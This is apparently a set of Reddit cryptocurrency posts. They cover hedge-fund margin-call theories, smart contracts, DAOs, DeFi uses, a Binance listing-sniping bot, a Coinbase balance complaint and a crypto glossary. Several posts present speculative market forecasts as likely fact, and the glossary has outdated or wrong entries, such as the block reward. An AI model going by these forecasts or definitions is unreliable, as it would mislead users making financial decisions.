top of the tower, and have had the pin pulled.   However, whether or not they're the catalyst is relatively unimportant in the overall picture - the markets are over leveraged on crazy high margin right now either way. There was a liquidity test last week, and the results were not published, but the markets have been...sketchy at best since then. Because of how over leveraged the market is, I believe that virtually any hedge fund that gets margin called is too big too fail, because it's walking on that much of a knifes edge. And when it comes down, it's going to take everything down with it, from the real estate market (both commercial and residential). I believe that speculative assets in tech and crypto are going to be particularly hard hit. The house of cards is staggering like a drunk man that just got hit in the head, and doesn't know that he's bleeding internally and about to die of an aneurysm.   So why did Crypto across the board see such a huge (and similar across different currencies) dip followed by a massive rebound? Because as a largely unregulated asset, it's extremely ripe for pump and dumps. Hedge funds can use it to inflate their assets on paper and get access to margin.   And I believe that yesterday they got margin called. GME has been sitting above what the speculated margin call price should be for a day or two now (although nobody is certain what the exact price is at the moment, the speculation is between 170-180) and their lenders were demanding better collateral than the crypto they had on their books. When you get margin called, you have some time to come up with the required collateral before it's considered a default and your broker starts liquidating your positions. I believe they met their margin requirements this morning, managed to hold off default for another day, and immediately started pumping crypto again. They simultaneously shorted GME down and dropped the price from $180 to $165, thus probably lowering their margin requirements as well.   Again, I can't stress this enough: while I believe that GME and the hedge funds and market makers massive short position is involved, the argument that a bunch of hedge funds got margin called yesterday is not dependent on that - the market has been dipping the past few days, and it could simply be a matter of being over leveraged and seeing a few red days in the market that caused a margin call. All of the people all over the world that have been buying GME at unprecedented rates for the past 4 months could be totally wrong. But even if they are, this crypto dump still has the looks of a margin call. Both BTC and ETH have dropped over 50% from their ATH this morning before the rebound. The timing of hitting their low points 3 minutes before OCC-007 (which raises collateral requirements for the month) came into effect seems telling to me that somebody was really close to going under.   And I believe that this is the first of many margin calls, and eventually, somebody is going to default, and the dominos will begin to fall, leading to a massive market correction (or collapse, depending on how you want to look at it) that leaves everybody hurting bad.   What happens next, and how I personally plan to respond is more up in the air. The Fed can respond to this in a variety of ways. They can opt to fire up the printer and start devaluing our currency to try and buy our way out of debt with a worthless USD, or they can opt to embrace the pain and raise interest rates and create a few decades of pain and stagnation while we dig our way out of a deep depression through long term austerity. Whether or not I (and everybody else betting on the GME thesis) are right will also play a big role in what happens next. If we are correct, it's going to create what is essentially a black hole for liquidity in the markets, as money flows out of the hands of the wealthy and leaves big reliable blue chip companies, and moves into the hands of GME holders. If that's the case, money is going to be flowing into the hands of people who have a deep, deep distrust of the US financial system and the regulatory agencies, and I anticipate a massive boom in crypto's as people look for places to store their money outside of US financial market control. If my speculation is correct, we'll see bitcoin hit the teens (or maybe even single digits) before they begin to climb back up, and we'll eventually see surging and setting new ATH's in the near future afterwards, and a similar story for ETH. I'm less certain about the less well known coins - my assumption is that they will not see nearly as much of a rebound as BTC and ETH, but who knows.   If the GME thesis is not correct, but the economy does crash and the fed Fed fires up the printer, I still anticipate a huge rebound in crypto - it is, afterall, still ripe for pump and dumps, and at the end of the day, it is in theory a pretty good place to store value in an inflation resistant location.   If the Fed opts to raise interest rates and embrace deflation over at the opposite end of the spectrum though, than cash will be king and crypto will be utterly screwed for the next 5-10 years I'd bet. If hyper inflation is a great way of turning a Weimar Republic into a Nazi Germany, deflation and austerity are a great way of turning into Greece. Neither are great options though. Hopefully some smarter people can come up with something better.    TLDR: If the market crashes, which is very likely, Crypto is set to take an enormous dip with it. Every hedge fund that's dipped its toes in is going to dump it like a hot potato, and if you thought it dipped fast this morning when it dropped over 20% in an hour, what comes next will make your head spin. But for now, they met their margin call and live to fight another day. Eventually though, somebody is going to trip and the economy is going down with them. And when that happens the Fed will be forced to embrace either inflation or deflation, and I expect Crypto to rebound if they choose inflation. Additionally, if the theory of GME turns out to be correct, there's going to be quite a few new millionaires with money burning a hole in their pocket to be spent, and they'll be looking for speculative inflation resistant assets that are not subject to corrupt US regulatory agencies. There's always the possibility that over the next few months, companies slowly manage to deleverage and increase their collateral without causing a market wide panic for the exits, and simultaneously the GME theory of everything is wrong, and the markets continue largely as they have been now.   Whatever the case, I believe it's going to be a bumpy ride with more volatility in the near future, and I wish all of you the best.

In fact, they offer no guarantees about decentralization whatsoever.They CAN be used for these things, but what they really are is much simpler.Smart contracts are immutable scripts that exist on the blockchain.  They maintain a state (i.e. they store data) and they have functions that can be called.  That's it.The only way to interact with a smart contract is to call one of its functions.  There are read-only functions that can be called on any Ethereum node to read some data out of the contract, and then there are functions you can call that modify data in some way, but those require sending a transaction and paying gas.You can use this functionality to do many things, but it is important to note that they do NOT ensure anything.  You can write backdoors into smart contracts.  Smart contracts can have admins that have the ability to yoink all the funds out of it.  There are categories of bugs that allow a malicious smart contract to attack other smart contracts if they can get that contract to call one of their functions.  Like all code, smart contracts can be written poorly or well.  The guarantees come from the implementation, not the nature of smart contracts themselves.  The same is true for banking software or other non-blockchain apps.The key difference is that the code for smart contracts is (mostly) immutable.  Once they are deployed, the code cannot be changed.  However, there are some exceptions to note:* Smart contracts can be written so that they are destroyed by calling a destructor function.  After that, the contract becomes invalid and can't be interacted with* A smart contract can be modular and call other smart contracts.  You can 'upgrade' one smart contract by deploying a new modular component and pointing the old contract to the new one with updated functionality.Don't get caught up thinking that smart contracts are some amazing thing that solves all of our problems when it comes to creating safe, verified transactions.  They are just code, that's it.   People can still write shitty code.EDIT: As others have pointed out, I'm speaking specifically about Ethereum smart contracts.

From the data we have, many of his recommendations are profitable in the short term (usually a couple of months).

However, one year's worth of data really isn't that much, and I think you should always have more in BTC and ETH than in any of these recommendations combined.Edit: I wrongly stated that Secret Network did not outperform BTC or ETH.

Let's have a look:**https://preview.redd.it/0us34zsk3jd81.png?width=2108&format=png&auto=webp&v=enabled&s=1dc74739e55bf6b7d86dd56ea6798fa0163c4719**There was no bear market. There was a relatively small crash in 2020 as everyone panicked over Covid. That's not a bear market. This picture also shows you that it's even worse, the market has been absolutely parabolic for almost 2 years.** That's the S&P 500 index. Notice something? Every ten years or so there's a severe downward correction which lasts 1-2 years. In the early 2000s it was the tech bubble, in 2008/9 it was the mortgage crisis. As you can see here, we've been in a sharp uptrend for over 10 years now. This uptrend has been fueled not in small part by record low interest rates. This is turn has resulted in parts of the market being hopelessly overvalued, a prime example being Tesla.Now look at the crypto charts, specifically the top 50 alts. Most of them have had absolutely face melting pumps over the last 18 months. Do you think that's just going to keep going up? Their valuations are now so ridiculous that 'crypto market caps' are basically a meme, completely detached from reality. Of course market caps are hardly ever a true reflection of what company is worth, but they are a reflection of the amount of speculation in the current market. Just to look at a few:Cardano MC $36 billion, doesn't have fully functional smart contracts, lots of promises while continually underdelivering, if at all.Solana: MC $30 billion, has been unusable for the last 48 hours, has suffered multiple outages over the last 6 months which lasted up to 17 hours.Dogecoin: $18 billion MC....don't think I need to go into more detail on this one.Ethereum: $288 billion market cap, supposed to disrupt the global banking industry (along with everything else), meanwhile it costs $200 for a simple ERC20 token swap.BTC: $665 billion market cap, supposed to be the future of digital store of value, meanwhile, has lost more than 50% in value over the course of 2.5 months.etc....The point is that these market caps aren't a reflection of the current states of those projects, but rather their promised states at some future point in time. Unless that point in time is very close as in a few months away, that's not sustainable. I personally don't think that point in time is very close, as almost nothing in crypto currency works as advertised.**What would a multi year global bear market mean for crypto?**'- BTC bleeds more than stock market'- ETH bleeds more than BTC'- Alts will bleed even heavier than ETH and a good number will never recover. You have to remember something very basic here: if an alt your holding loses 90% of its value in the bear market, it has to pull a 10X just to get back to its previous price.**Further complication:**DCAing into projects is obviously the way to go in a bear market, but it becomes more difficult to predict what projects will have merit the longer the bear market continues. Will your favourite project still be relevant in 2024 or will it be replaced by something that hasn't even launched and won't until 2023? The longer the bear market lasts, the more likely that outcome becomes. Do lots of research, try to keep up with the tech developments in crypto.

They are telling us that BTC, ETH and such are basically worthless because it doesn't have a physical existence and are not backed by a government.Well, those people conveniently forget that fiat money doesn't exist, either. Well, most of it.You see, banks are allowed to leverage their holdings in what is called the fractional reserve banking system. If you deposit 100$, for example, they only keep a fraction of that money in cash (let's say 20$), and they use the remaining 80$ to generate yield, generally by lending. What that means is, if every customers of the bank tries to cash out in a short amount of time, **the money won't be there, because it's been lent and doesn't exist anymore**. When you deposit cash in a bank, what you get in return is basically a glorified IOU. Should the bank get into trouble, your cash could very well disappear.Now, of course, the governement can intervene to prevent such bank runs. But it's always in the favor of the rich. That's what happened in 2008-2009 : the fat cats got bailed out, while the ordinary citizens went into bankruptcy. And it only works in stable countries ; when you live in a failed state, the government won't help you in such a crisis.Compare that with crypto. If you are in control of your keys, and assuming their are not compromised, **nobody** can access your funds without your permission. Not the wallet devs, not the government, not the DEX. Nobody. **You are in full control, and you will still be in control even if the governement of your country collapse**. In that sense, I think that cryptocurrencies are actually more real then fiat money. Decentralised networks are much more resilient then centralised authorities, and therefore are more likely to survive in the long-term.I think we still got a few years ahead of us before the mainstream media catches up with this revolution.

I tried out different variations on this, end even increased the speed to buy within 0.1 seconds on a new coin being listed.After looking at the results, and talking to some of you on here, it turns out that the spike in the price upon listing the coin is actually the peak of the iceberg.The real activity seems to happen once Binance Announces that they will list the coin, and not upon the listing itself.Have a look at the chart for FIDA/USDT below, and the time Binance made the announcement:[FIDAUSDT](https://preview.redd.it/q6bnt5noynu71.png?width=1536&format=png&auto=webp&v=enabled&s=35ab7423f89f9c162619f36459f9cf36d1e13072)https://preview.redd.it/689yka0rynu71.png?width=677&format=png&auto=webp&v=enabled&s=c6d9d916a52c6b3a4530cd51cb5b2c7255474e7d&#x200B;Looks like people are fomoing hard into new coins on different exchanges in anticipation of a Binance pump, ironically creating the pump themselves.So with that in mind, I built a crypto trading algorithm that listens to the Binance announcement page, and once there is an announcement for a new coin listing, the bot extracts the symbol of that coin and places a Buy order on Gate .io.The tool will automatically place buy and sell orders and it has a trailing stop loss feature, meaning that it should sell at the optimum time, in theory.I chose gate .io because according to what I've seen and what some of you have said, this exchange seem to list many of the coins that later make it on Binance or other bigger exchanges.The tool is free to use for everyone, but I suggest running it in Test mode at first, as I still need to confirm that everything runs fine. Annoyingly, gate .io doesn't have a testnet which means I had to test the buy/sell logic by placing real trades - not ideal.But I've included a test mode for the tool itself, so it won't actually call the gate .io API, it will just simulate the trades locally.I'm currently waiting for new annoucements to test out the profitability and will report back.

So it would appear our money is gone, because our balances are zero.  We've all opened tickets with support with absolutely no responses, posted on their subreddit, and called to only be on hold for hours without any help.

Since I doubt they'll respond again to me (and my balance is still 0 on GDAX so basically this whole issue was still not enough to fix our problem) - here's my response:What proof do I have that my coins are not lost? My balance on GDAX is 0, and my LTC balance on Coinbase is 0. This kind of thing should be a priority issue if people are getting balances of 0 on GDAX with an automatic send to their wallet transfer from Coinbase to GDAX like this. I'm even more frustrated that with 3.5k upvotes and a response, my LTC balance is still 0 from an error on their side.One last clarification: I do not have any pending transfer issues (these I'm familiar with an have learned to wait). The transaction on the blockchain finished, the funds even appeared in my Coinbase account. The automatic transfer from Coinbase to GDAX (which has happened at least 5-10 times with no issues for me) this time withdrew the money from my Coinbase account and said the deposit to GDAX was completed. But my balance is 0 for LTC on Coinbase and 0 on GDAX, so this last move to GDAX (which is supposed to be instant, and says completed) zeroed my LTC balance. My balance has been 0 LTC for over 3 days now. This has nothing to do with their wire transfers, although I really feel for everyone still waiting on their withdrawals and hope they resolve that soon.UPDATE: it's been 4 days and still missing all of my LTCUPDATE: 5 days now.

WAPP offers additional protection and security for user funds held in the Crypto.com App and the Crypto.com Exchange.  >  >WAPP is designed to protect user funds in cases where a third party gains unauthorized access to their account and withdraws funds without the user's permission. WAPP restores funds up to USD$250,000 for qualified users; terms & conditions apply.Some noteworthy things you must do to qualify for the WAPP:* Enable Multi-Factor Authentication (MFA) on all transaction types where MFA is currently available,¬†* Set up an anti-phishing code at least 21 days prior to the reported unauthorized transaction,* Not be using jailbroken devices,¬†* File a police report and provide a copy of it to Crypto.com; and¬†* Complete a questionnaire to support a forensic investigation.The WAPP will begin rolling out in select markets starting 1 February 2022.¬†CDC has also :1. migrated to a new 2FA infrastructure, with a longer term plan to migrate  to true Multi-Factor Authentication (MFA).2. Introduced an additional layer of security on 18 Jan to add a mandatory 24-hour delay between registration of a new whitelisted withdrawal address, and first withdrawal.3. Full audit of the entire infrastructure4. Engaged with third-party security firms to perform additional security checks + threat intelligence5.

At its core they have an objective to provide a decentralized business model for all future enterprises. Mark Cuban called them the ultimate combination of capitalism and progressivism.One important aspect is that all code is open-source. This is done with the aim to eliminate human error, manipulation, and third parties, by having an automated crowdsourced process of decision-making. Unlike a company, DAOs have democratized organizations allowing all members to vote for any implemented change. The DA organization is represented by transparent computational rules, secured on the digital ledger across the internet, hardened against forgery by timestamping, and disseminated as a distributed database. The DAO is controlled by the members; no managers or basses are needed.>Bitcoin in essence is the first fully functional DAO with programmed rules and functional autonomy through consensual protocol; the miners and nodes signal voting through support.**DAOs need four things really;*** A set of rules,* A funding token,* Voting right provisions,* A clear structure & roadmap|**DAOs**|**A traditional corporation**||:-|:-||Flat hierarchy.|Hierarchical.||Voting required for any changes.|Changes demanded from sole party, voting   may be offered.||Voting outcome implemented automatically.|Tallied internally and outcome handled   manually.||Services handled automatically in a decentralized manner.|Human handling, centrally controlled automation, prone to error and manipulation.||All activity transparent and public.|Activity private.|**Creation of a DAO:*** Step one; create a smart contract that once launched the rules can only be changed by coded governance system.* Step two; sources of funding must be determined and governance must be engaged, typically funded via token sale that come with voting rights.* Step three; deploy smart contract on the blockchain from which point onward stallholders will decide future organization. The dev(s) have no more influence than any other stakeholder.&#x200B;**How can I join a DAO?:**  Just invest in their token, and boom, you've joined. The smart contract token you just bought establishes the DAO's rules, most likely you have to stake the token or another in the DAO to get voting rights and influence operations. This is typically done by deciding on and creating governance proposals. The fact that you need to stake to create proposals is to prevent spam proposals, and only (typically) proposals will pass if a majority of stakeholders approve (different percentage majority per DAO; specified in the smart contract).**What's the point? Where is the need?**  Are we all not internet native, or soon will be? DAOs are internet-native organizations with technological advantages compared to traditional companies. They have and establish a higher level of trust then say, the classical corporate hierarchy. Only the open source code needs to be trusted which is transparent thus auditable and verifiable at any time. This solves the economic principle-agent-dilemma where there may be a conflict of priorities between a group and those making the decisions for the group. The answer is community governance where incentives are aligned. There are charity DAOs, ones for NFT investments, for funding projects by Black women and non-binary artists, for funding women and non-binary crypto founders, some are exclusive social clubs, and others are for-profit business applications. I've even seen freelance DAO networks of contractor.>**Examples of DAOs:**  Aragon, MakerDAO (MKR), DAOstack, DASH, JennyDAO, Jelurida, SharkDAO, DAOhaus, RaidGuild, Proof Of Humanity, Opolis, BanklessDAO, MolochDAO,**Downsides of DAOs:** No organization is perfect, decentralized or autonomous or not. This is extremely new technology that continues to attract criticisms over legality, security, and structural issues. As a DAO can be distributed across multiple jurisdictions, there is no legal framework. One may have heard about The DAO' crashing, as back in 2016. The DAO' was launched on Ethereum and raised $150 million in ETH (largest crowdfunding effort at the time) but a few days later developers expressed concern about a bug that would allow malicious actors to drain funds, and while a proposal was set forth to fix it an attacker took $60 million worth of ETH. At the time, 14% of all circulating ETH was invested in The DAO'. Chaos ensued and a hardfork was implemented on ETH. Those who disagreed moved to support an earlier version of the ETH network, which became known as Ethereum Classic, or ETC. Point being if any gaps in the contract framework aren't closed before launch, it can lead to potential theft and money loss. *There is no such thing as a fully D & A organization.*  Depending on governance, there are only various levels of decentralization. While the network may have independent but equal network actors, the smart contract rules themselves will always be a centralized loss of direct autonomy; architecturally and geographically decentralized yes but logically centralized on the protocol. Upgrading of code is often delegated to experts who understand techno-legal intricacies of code and are therefore a point of centralization.**Future of DAOs:**  Despite the potential for DAOs to revolutionize the industry, and be a disruptive force to corporate structuring as a whole, they face security and legality issues.  As we all know the SEC claims some blockchain based companies might have made illegal offers of unregistered securities. There is also a lack of understanding about cryptocurrencies from new investors, not to mention the technical competence one needs to understand the computational infrastructure and consensus mechanisms within the smart contract to feel good about investing in it. It's not all bad though, Wyoming just became the first state to recognize DAOs as legal entities. DeepDAO says there are about 181 DAOs, with an ecosystem's total assets under management (AUM) of $13.4 billion.Somewhere, in some business boardroom, people are trying to figure out how to integrate self-driving cars into DAOs of autonomous taxi drivers.

But I want that to change so I'm putting together this huge list of all the cool things you can do in defi and web3.# Trustless LoansDefi is revolutionary for this. With Maker (or many other protocols), you can deposit collateral & take a loan on your assets to use in the real world wherever. This process involves no bank, no intermediary fees and offers much higher yield than trad finance. In fact, Tesla just did a real estate backed loan with maker dao.&#x200B;https://preview.redd.it/pa8dz8uan5v81.png?width=1650&format=png&auto=webp&v=enabled&s=debc7dc20c2b8ad8675409038517b48a8c53aa24# LotteryWant to join the lottery? Well, PoolTogether isn't just any lottery. It's a DeFi protocol allowing for 'no loss lotteries.' How? Users are able to deposit funds, & yield is given to a verifiably random address in the pool. Losers can then still withdraw their assets.&#x200B;https://preview.redd.it/cxdhkz5vn5v81.jpg?width=1017&format=pjpg&auto=webp&v=enabled&s=4a9fbb812d55095d4fe19603c69db135a28c15b3# Aave Flash loansIf I told you that you could get millions of dollars in assets in seconds, with no bank, with no collateral, and at no risk to the lender... I'd probably sound crazy, right? Well, flash loans on Aave are built to be repaid in the same tx, otherwise it'll revert and fail. You can do this to perform arbitrage trades and other cool things.&#x200B;https://preview.redd.it/vvo2akyxn5v81.jpg?width=574&format=pjpg&auto=webp&v=enabled&s=8c3cb2857224f15e36fd0e7a3498b382dd27f9b5# GamblingWant to place a bet?

This ensures that this group gains full control over this blockchain. For example, they can stop all mining, stop all transactions or spend every coin of this specific blockchain infinitely often.* **Address**A cryptocoin address is the location where you store your crypto coins and from where you send and receive your coins. You could compare it with your home address. This address usually consists of a whole row of numbers and digits, which looks something like this: 1KXghhUZRVFmfk9Jreo3vvuV3HDoCJyYJZ. This address is the public part of the two encrypted keys (see private and public key) that are required for the holder to verify a transaction.* **Airdrop**This is a kind of giveaway for founders who determine a particular cryptocurrency, giving those coins or coins away. The promotion is for a short period. This is done to publicize the tokens and distribute the tokens.* **Altcoin**This name is used for all crypto coins that are not Bitcoin (alternative coins).* **Altseason**This is the term given when money flows to altcoins faster than Bitcoin. In other words, when investors buy more altcoins than Bitcoin.* **AMA**Ask me anything. A (mostly) new crypto project likes a session for users to ask them questions about the project. Reddit and Discord are often used for this.* **AMM**Automated Market Maker. That is to say, it is a kind of decentralized exchange platform (DEX). A mathematical formula is used to price assets. In a traditional exchange, it works differently, and assets are priced according to a price algorithm.* **Arbitrage**Buying and selling the same asset on two exchanges to take advantage of small price differences.* **ASIC mining / miner**ASIC stands for Application Specific Integrated Circuit. This is, in fact, a chip that is specially designed to perform one specific task. For this reason, thanks to ASIC mining, you can mine coins a lot faster than a regular computer or laptop could. For example, for Bitcoin, there are special ASIC miners who are only concerned with solving the SHA-256 algorithm. There are also crypto coins that are impossible to mine with an ASIC.* **ATH**ATH means All Time High. This is the highest price a cryptocurrency has ever achieved.* **Bag**A bag in the crypto world refers to the coins and tokens that you hold as part of your wallet. Typically, the term is used to describe a significant portion of a particular cryptocurrency. For example, a 'moon bag' is filled with the coins you currently own that you think will make you rich.* **Bear market**A bear knocks everything down with its claws. That is why a market where the trend is in a downward movement is called a bear market. Sentiment is then negative and prices predominantly fall.* **Blockchain**A blockchain is a kind of digital ledger of transactions that works from a decentralized network. Thanks to cryptography, a ledger can be kept by a large number of computers that together create the network. Every time a new transaction is made, it is added by the miners with date, size, etc. to the blockchain as a new block.* **Block**The blocks are the 'pages' in the digital ledger of the blockchain. These are files with immutable data that are permanently stored on the blockchain.* **Block reward**The block reward is the reward that miners receive for finding a mathematical solution related to that block. With Bitcoin, this reward is 25 Bitcoins per mined block. This halves every 210,000 blocks.* **BTFD**Buy the f '* cking dip! This term is used when the price of a cryptocurrency or the market is in a dip. People are inclined to leave because they are afraid of losing. But a dip offers opportunities to buy a coin or token cheaply before it starts to rise again.* **Buy the Dip**Same as BTFD only without the expletives.* **Bull market**A bull stabs its horns and throws you up. That is why a Bull Market is a market where the trend is in an upward movement. Prices are rising and sentiment is positive.* **Cold storage**Cryptocurrency is stored offline. You do this if you want to safely store coins for a longer period of time. A hardware wallet is an example of cold storage.* **Cryptography**Also called secret writing. This focuses on techniques for hiding or encrypting information to be sent so that it is impossible for anyone accessing the channel on which it is sent to find out what information was sent.* **Cryptocurrency**A kind of digital currency based on cryptography. This concerns both Bitcoin and other altcoins.* **DAO**A DAO is a 'decentralized autonomous organization' and can be described as an open source blockchain protocol governed by a set of rules, created by its elected members, that automatically perform certain actions without the intervention of intermediaries.* **dApps**These are decentralized applications (dApps) are digital applications or programs that exist and run on a blockchain or P2P network of computers rather than a single computer, and are beyond the reach and control of a single authority.* **DeFi - Decentralized Finance**DeFi, or decentralized financing, is a new way to conduct financial transactions through applications. It excludes traditional financial institutions and intermediaries and is run through the blockchain. Think of it as removing brokers, exchanges, banks and other middlemen from the equation.* **DEX**A DEX is a Decentralized Exchange or a decentralized exchange. Decentralized exchanges are a type of cryptocurrency exchange that allows direct peer-to-peer cryptocurrency transactions to take place online securely and without an intermediary. No identification is required at these exchanges.* **Distributed & Central Ledger**A distributed ledger is an agreement of shareable, shared, and synchronized data, which in this case is spread across several networks. These networks are then distributed over many computers.With a central ledger, the synchronized and shareable data is controlled by one network or individual.* **Double Spending**This means that a particular cryptocoin can be spent more than once. This stops the blockchain from working.* **Dust Transaction**A transaction of extremely few coins that represents almost no value, but takes up space on the blockchain.* **ECDSA**Elliptic Curve Digitial Signature Algorithm is a lightweight cryptographic algorithm used to sign transactions on the Bitcoin protocol.* **ERC20 token**An ERC20 token is in some ways comparable to Bitcoin, Litecoin and any other cryptocurrency; these tokens are assets based on blockchain technology. They have value and you can send and receive them. ERC20 tokens are only issued on the Ethereum network.* **Escrow**A concept in which financial assets are held by a third party to protect them during an asynchronous transaction.* **Fiat money**Currencies that were once backed by gold (golden standard). Currently it only has value because people value it.* **FOMO**'Fear Of Missing Out'. This often occurs when a cryptocurrency increases in value so quickly that people are afraid that they will miss the boat to riches, causing the price per coin to be even higher.* **FUD**'Fear, Uncertainty, Doubt'. This crypto term is often used to describe the volatility of the crypto market.* **Fork (branch / split)**A fork happens when an alternate operational version of the current blockchain separates permanently. This can be done in three different ways:* By a 51% attack* Because there is a bug in the program* Because new substantial changes have to be made to the current blockchain.* **Genesis block**The block mined first in a blockchain* **Halving**This means that the minable reward (see block reward) is halved. This happens every time with a certain amount of mined blocks. With Bitcoin, for example, this is for every 210,000 blocks.* **Hash**A mathematical process that takes a variable number of data as input and produces a shorter result of a fixed length.* **Hashrate**This is the speed at which the math problems for certain blocks can be solved. In other words, the speed at which a new block can be discovered. ASIC mining, for example, causes the hash rate to go down.* **HODL**Originally 'Hold' was meant, but in a tipsy mood a chat participant kept talking about how he was 'hodling' his coins. This quickly became a meme and now it has become established in the crypto world and means holding onto your crypto coins for the long term. Sometimes it also refers to 'Hold on for dear life'.* **ICO**Stands for Initial Coin Offering. This is a form of crowdfunding, where the public can invest in a blockchain startup in advance. As a thank you for the financial support they are rewarded with a certain amount of coins.* **IEO**This is an Initial exchange offer. It is a variant of Initial Coin Offerings (ICO), managed directly by cryptocurrency exchanges.* **KYC**This stands for 'Know Your Customer'. It refers to the verification process that customers must go through to verify their identity and associate it with a cryptocurrency wallet. Crypto exchanges gain a better understanding of the potential client's activities and can determine whether or not they are legal in nature. A legal requirement for many central exchanges (CEX) to admit customers to their fair.* **Mining**Mining is the crypto term used to search for new block rewards. For finding and solving blocks, a reward is given to the miner.* **Moon**When a cryptocurrency 'goes to the moon,' it means people think its price will rise exponentially.* **Multisig (multiple signatures)**Multisignature is a form of technology that ensures that extra security is added to Bitcoin transactions. Multisiganature addresses require another user to sign the transaction before it can be added to the blockchain.* **NFT**An NFT is a Non-fungible Token. They are unique and cannot be exchanged. They live on the blockchain.* **Node**A node is a computer connected to the crypto network that uses a client tasked with validating and tracing transactions. Each node receives a copy of the current blockchain, which is automatically downloaded when it joins the Bitcoin network.* **P2P**This stands for peer-to-peer. A (crypto) term that refers to computers that directly build a network with each other without a central server in between.* **Privacy coin**These are a class of cryptocurrencies that enable private and anonymous blockchain transactions by obscuring their origin and destination. Some of the techniques used include hiding a user's real wallet balance and address, and combining multiple transactions to circumvent chain analysis. Examples are Monero (XMR) and Zcash (ZEC).* **Private key**A string of letters and numbers that is kept secret by the user. It is specially designed to sign a digital transfer using a public key. In the case of Bitcoin, this is a private key that must work with a public key.* **Public key**A string of letters and numbers that is public and can be viewed by anyone. This can be used in combination with a private key to sign a digital transaction.* **Pump and Dump**This is a crypto term used for the unethical process of pumping and dumping a relatively cheap coin. The coin is first obtained in a very cheap way by a certain group of persons who then 'pump' the coin (make its value rise sharply) by advertising it a lot. When the coin has appreciated enough, they dump their coins with a lot of profit, leaving a large group at a loss.* **PoW**Stands for Proof-of-Work. This is a system that links computing power with mining capacity. The more powerful your computer can mine, the more you will be rewarded for this.* **PoS**Stands for Proof-of-Stake. This is a system that links the interest in a particular crypto coin to the mining capacity. This means that the more tokens you own of a particular crypto coin, the more you can mine this coin.The PoW and the PoS are both consensus algorithms. With this mechanism you can organize as a user, but also machines, in a distributed environment. All agents, the nodes of a blockchain, must agree on a single source of truth. Even if some of the nodes fail. This means that the system must be fault tolerant.* **DPos**Stands for Delegated Proof-of-Stake. This is a variant of Proof of Stake that uses supernodes or masternodes to approve transactions.* **Scam coin**A coin created for the sole purpose of making the creator of this coin rich (usually through pump and dump).Often this is accompanied by a Pyramid scheme. A pyramid scheme is a business model that recruits members through a promise of payments or services to enroll others in the scheme, rather than providing investment or selling products.* **SHA-256**The cryptographic algorithm used for Bitcoin's PoW system.* **Signature**A signature is a mathematical process by which someone can prove that he / she is the owner of his / her wallet. For example, a 'private key' is used.* **Smart Contract**A two-way smart contract is an immutable agreement that is recorded on the blockchain, containing specific logical actions that are comparable to a 'normal' contract. Once this contract has been signed, it can never be changed again. A smart contract can be used to set certain benchmarks that must be met in exchange for money.* **Wallet**See 'address'* **Whale**A whale is someone or a company that owns a large percentage of a particular crypto coin. It is often the case that a whale can also manipulate the price of this crypto coin.* **Whitepaper**A document that describes in detail the protocol of the crypto currency.* **Yield Farming**Yield farming, this is also known as liquidity mining. This allows you to generate a way for rewards with cryptocurrency holdings. In simple terms, this means locking cryptocurrencies and receiving rewards.

It's been a challenge to test since I have to wait for a new coin order and then check if it broke or not, but I think I finally got there.Before I go explaining how the tool works, let me explain why I think that this particular strategy has some potential:As some of you may have noticed, many coins seem to go through to what I would like to call a 'lightning-pump' during their first few seconds of being listed on an exchange.Have a look at ICP (you may put your pitchfork down, this chart is the perfect example):&#x200B;[chart for ICP](https://preview.redd.it/renmiomwk3k71.png?width=2650&format=png&auto=webp&v=enabled&s=ce6f2eee0528f183fe4cad407affb02ad356546a)In under a minute, the price of ICP shot up over 10 times, before slowly dipping into the void. Manually trading this 10x would be impossible, due to the speed required to catch this pump.So I started building a bot that would detect new coin listings in about 20 seconds of them being listed on Binance.It soon became quite clear that 20 seconds is way too slow to take advantage of the pump so I had to make it quicker.The second improvement enabled the trading algorithm to find a new coin and place a buy order in about 5 seconds. This was better but not great.Finally, I decided to remove all the breaks and just call the Binance API like crazy. Full steam ahead.The bot is now able to detect a new coin listing in 0.3 seconds and place an order. There haven't been any new coins listed after I made this improvement so I will let it run and share my results once I have them.I've also fixed any bugs that were caught by some of you that decided to test this out so thanks for that!For anyone interested in trying it out, I've included a test mode that will simulate placing orders so there's no risk involved.&#x200B;**Here's a step by step guide on how to build it as well as an in-depth anatomy of the code:**[https://www.cryptomaton.org/2021/08/15/coding-a-binance-trading-bot-that-detects-new-coins-the-moment-they-are-listed/](https://www.cryptomaton.org/2021/08/15/coding-a-binance-trading-bot-that-detects-new-coins-the-moment-they-are-listed/)**For the GitHub source code please go here:**[https://github.com/CyberPunkMetalHead/binance-trading-bot-new-coins](https://github.com/CyberPunkMetalHead/binance-trading-bot-new-coins)If you have any ideas on how to improve the stability or the speed of the code, please feel free to submit a PR.&#x200B;**Edit:****For those of you who asked for a YouTube video before - here you go!** [**https://youtu.be/mIa9eQDhubs**](https://youtu.be/mIa9eQDhubs)",False,The trading algorithm I made can now detect a new coin within 0.3 seconds of it being listed on Binance,u/[deleted],99,4092,0.92,https://www.reddit.com/r/CryptoCurrency/comments/pd9gct/the_trading_algorithm_i_made_can_now_detect_a_new/,[]

I later realized that a lot of people may not know the differences between a coin and a token, so I'm going to explain that here!Let's start off with what a blockchain even is! A blockchain is just software that is open source and distributed across many computers. These computers that run the blockchain software are considered nodes, and they keep track of the blockchain ledger, and any coins, tokens, and transactions associated with it.The coins on the blockchain are just data (ones and zeroes) that is already written into the software. Using Bitcoin as an example, all 21 million Bitcoins are already in the Bitcoin software, and ownership of these coins is designated through the use of public and private keys, which gives the owners access to their Bitcoin on the blockchain. Also, with each new transaction block that is mined, new Bitcoins are awarded to the miners that processed these blocks. I touched on this whole process in my [previous](https://www.reddit.com/r/CryptoCurrency/comments/mmltsq/why_do_we_have_coins_and_tokens_a_quick_primer/) post.In other words, coins on a blockchain are just part of the software itself, and are there from it's inception.Tokens work a bit differently, in that they're smart contracts that are deployed onto a blockchain, and are not innate to the blockchain software itself. Using Ethereum as an example, a token (such as an ERC-20 token), is something that a user creates, and deploys onto the blockchain software via smart contracts. When a token is added to the blockchain, the creator of the token is able to write the rules for how a token will work i.e. the max supply, tokenomics, burn rate, functions, etc. All of this is handled in the smart contract portion of it's creation. Tokens do not have their own blockchain, so they have to abide by the rules of the governing blockchain i.e. Ethereum.Hopefully this helps to explain the differences between a coin and a token!",False,What's the difference between a coin and a token? - a quick primer for beginners!,u/[deleted],145,4089,0.97,https://www.reddit.com/r/CryptoCurrency/comments/mn8662/whats_the_difference_between_a_coin_and_a_token_a/,[]

